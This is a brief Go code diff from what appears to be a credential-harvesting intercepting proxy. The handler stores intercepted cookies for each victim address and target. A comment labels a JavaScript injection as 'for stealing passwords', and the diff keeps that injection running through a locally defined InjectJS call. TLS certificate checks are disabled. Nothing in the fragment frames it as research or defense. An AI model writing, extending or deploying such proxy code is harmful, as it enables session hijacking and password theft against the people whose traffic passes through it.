@@ -29,7 +29,8 @@ func ProxyHandler(w http.ResponseWriter, r *http.Request) {
 				storage.SaveCookie(r.RemoteAddr, target, c)
 			}
 			// JS injection for stealing passwords
-			injector.InjectJS(resp)
+			//injector.InjectJS(resp)
+			InjectJS(resp)
 			return nil
 		},
 		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
